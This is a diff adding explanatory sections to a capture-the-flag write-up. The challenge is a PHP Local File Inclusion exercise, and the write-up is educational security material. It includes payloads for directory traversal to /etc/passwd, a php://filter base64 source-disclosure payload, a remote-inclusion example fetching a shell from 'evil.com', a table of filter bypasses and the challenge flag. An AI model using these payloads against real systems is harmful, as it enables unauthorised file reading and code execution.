@@ -38,6 +38,53 @@ This wording is an intentional hint from the challenge designer — it signals t
 
 ---
 
+## What is Local File Inclusion (LFI)?
+
+**Local File Inclusion (LFI)** is a web vulnerability that occurs when an application uses user-supplied input to dynamically load files on the server — without properly validating what file is being requested.
+
+### How It Works
+
+When a web application loads pages dynamically using a URL parameter like:
+
+```
+index.php?home=about
+index.php?home=contact
+```
+
+The backend PHP code is likely doing something like this:
+
+```php
+include($_GET['home'] . '.php');
+```
+
+The problem is that `$_GET['home']` is **user-controlled** — meaning anyone can change the value in the URL to something the developer never intended.
+
+### What Can an Attacker Do With LFI?
+
+| Attack | Example Payload | Goal |
+|--------|----------------|------|
+| Directory traversal | `?home=../../../../etc/passwd` | Read system files |
+| PHP wrapper abuse | `?home=php://filter/convert.base64-encode/resource=index` | Read PHP source code |
+| Log poisoning | Inject into server logs then include them | Remote code execution |
+
+### LFI vs RFI
+
+| | LFI (Local File Inclusion) | RFI (Remote File Inclusion) |
+|---|---|---|
+| **File source** | Files already on the server | Files hosted on an external URL |
+| **Example** | `?home=../../../../etc/passwd` | `?home=http://evil.com/shell` |
+| **Risk** | Read sensitive local files | Execute attacker-controlled code remotely |
+| **More common?** | Yes | Less common — usually disabled by default in PHP |
+
+### Why Is LFI Dangerous?
+
+- Exposes **server-side source code** including hardcoded passwords and flags
+- Can reveal **system files** like `/etc/passwd` containing user information
+- In advanced cases can lead to **Remote Code Execution (RCE)** via log poisoning
+- Bypasses the assumption that server-side code is hidden from users
+
+---
+
 ## 3. Source Code Analysis — Identifying the Vulnerability Hint
 
 Inspecting the page source in the browser reveals the HTML that the server sent back. The PHP code itself is **never visible** here — PHP runs on the server before sending the page, so the browser only sees the final HTML output.
@@ -134,6 +181,19 @@ Common PHP wrappers:
 php://filter/[filter]/resource=[filename]
 ```
 
+### How Did We Know to Use `php://filter`?
+
+This comes from a step by step reasoning process — not guessing:
+
+| Step | Thought Process |
+|------|----------------|
+| See `?home=` in nav links | The server is loading files dynamically |
+| Try `../` directory traversal | Returns nothing — basic filter is blocking it |
+| Know PHP has stream wrappers | Research and CTF knowledge points to `php://filter` |
+| Try `php://filter` | Not blocked by the server's weak filters |
+| Use `convert.base64-encode` | So PHP encodes the file instead of executing it |
+| Write `resource=index` | Contains the word `index` — passes the third filter check |
+
 ### Why Use `convert.base64-encode`?
 
 When you try to directly include a `.php` file via LFI, PHP **executes** the file instead of showing its source code — so you see the output, not the raw code. By encoding the file as Base64 first, PHP cannot execute it — it treats it as a plain text string and outputs the encoded content instead.
@@ -149,7 +209,13 @@ This tells PHP:
 2. Apply the `convert.base64-encode` filter to encode the content
 3. Read the file `index` (the application will append `.php` automatically)
 
-Because the URL contains the word `index`, it passes the third filter check in the source code — and the `include()` runs with the PHP filter wrapper, returning the entire source code of `index.php` as a Base64 string.
+### How Does It Bypass the Server Filters?
+
+| Filter | Blocks | Does the payload get blocked? |
+|--------|--------|-------------------------------|
+| Block `../` | Directory traversal | ❌ No `../` in the payload — **passes** |
+| Block `php://input` | Only that specific wrapper | ❌ This uses `php://filter` not `php://input` — **passes** |
+| Must contain `index` | Filename check | ✅ `resource=index` contains `index` — **passes** |
 
 ### The Full URL
 
@@ -225,14 +291,15 @@ The application passes the `?home=` URL parameter directly into PHP's `include()
 # Exploitation Flow (OWASP A03 Mapping)
 
 1. Attacker accesses the Dark Project webpage
-2. Source code is inspected — `?home=` parameter passed into `include()` is found
-3. Three weak `preg_match()` filters are analysed and bypassed
-4. `php://filter/convert.base64-encode/resource=index` is injected into the URL
-5. The word `index` in the payload passes the third filter check
-6. PHP encodes `index.php` as Base64 instead of executing it
-7. Long Base64 string is returned in the page output
-8. String is decoded via Burp Suite Decoder or base64decode.org
-9. Full PHP source code revealed — flag extracted: **`{pHp_Wr4P3rs_4r3_Us3fuL}`**
+2. Source code is inspected — `?home=` parameter in nav links spotted
+3. Burp Suite confirms `home` value is sent as a GET parameter in the URL
+4. Directory traversal `../` is attempted — blocked by server filter
+5. `php://filter/convert.base64-encode/resource=index` is crafted as the payload
+6. All three weak `preg_match()` filters are bypassed
+7. PHP encodes `index.php` as Base64 instead of executing it
+8. Long Base64 string is returned in the page output
+9. String is decoded via Burp Suite Decoder or base64decode.org
+10. Full PHP source code revealed — flag extracted: **`{pHp_Wr4P3rs_4r3_Us3fuL}`**
 
 ---
 
